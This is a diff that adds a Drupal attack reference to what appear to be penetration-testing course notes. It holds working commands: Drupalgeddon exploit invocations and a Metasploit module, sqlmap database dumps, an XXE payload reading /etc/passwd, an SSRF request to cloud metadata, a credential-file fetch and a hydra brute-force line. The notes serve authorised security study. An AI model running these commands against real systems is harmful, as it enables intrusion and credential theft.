@@ -289,6 +289,60 @@ curl -s <URL>/admin
 
 > `settings.php` and exposed `backup.sql` leak DB creds — critical. Known Drupal RCEs (e.g. Drupalgeddon2 CVE-2018-7600) depend on exact core version, so fingerprint first.
 
+## Drupal — attacking (reference)
+Intrusive — scope + approval. Fingerprint the exact core version first; Drupalgeddon variants are version-specific.
+
+### PHP filter module (Drupal < 8)
+With admin, enable the core PHP filter module and inject PHP into content for RCE. Needs client comms before enabling modules. Fix: PHP filter removed in Drupal 8+.
+
+### Backdoored module upload
+With admin, a malicious module (e.g. a trojanized `captcha` package) can be uploaded for RCE. I don't store the shell payload — see the web-shell detection note in the WordPress section. Note: never modify production without explicit permission.
+
+### Drupalgeddon family (the big ones)
+```text
+# Drupalgeddon  CVE-2014-3704  — SQLi, creates an admin user (Drupal 7 core)
+python2.7 drupalgeddon.py -t <URL> -u <user> -p <pass>
+
+# Drupalgeddon2 CVE-2018-7600  — unauth RCE via user registration form
+python3 drupalgeddon2.py         # public PoC; drops a shell (payload not stored here)
+
+# Drupalgeddon3 CVE-2018-7602  — authenticated RCE via Form API (needs a valid session)
+msf6> use exploit/multi/http/drupal_drupageddon3
+msf6> set RHOSTS <IP>; set VHOST <URL>; set DRUPAL_SESSION <sess>; set DRUPAL_NODE 1; set LHOST <LHOST>; run
+```
+
+### Config exposure
+```bash
+curl -s <URL>/sites/default/settings.php     # DB creds if readable
+```
+
+### SQL injection → dump (sqlmap)
+```bash
+sqlmap -u "<URL>/node/1?id=1" --dbs --batch
+sqlmap -u "<URL>/node/1?id=1" -D <db> --tables --batch
+sqlmap -u "<URL>/node/1?id=1" -D <db> -T <table> -C <cols> --dump --batch
+sqlmap -u "<URL>/node/1?id=1" --level 5 --risk 3        # deeper, noisier
+```
+
+### Other web attack surface (primary homes in web modules 17/21/23)
+```bash
+# File upload (module 21) — test extensions, check MIME enforcement
+curl -F "file=@test.php" <URL>/<upload_path>
+# XXE (module 23) — read local files
+curl -X POST -H "Content-Type: application/xml"   -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' <URL>/<xml_endpoint>
+# SSRF (module 23) — hit cloud metadata
+curl "<URL>/page?url=http://169.254.169.254/latest/meta-data/"
+# Access control — admin reachable unauthenticated?
+curl -I <URL>/admin
+```
+
+### Brute force (scope + approval only)
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <HOST>   http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:Invalid username or password"
+```
+
+> XXE/SSRF/file-upload are general web attacks — primary notes build in modules 21 (upload) and 23 (web attacks); kept here as the Drupal-context quick reference.
+
 ### My notes / lab output
 Filled in once I run this on a WordPress / Joomla / Drupal target.
 
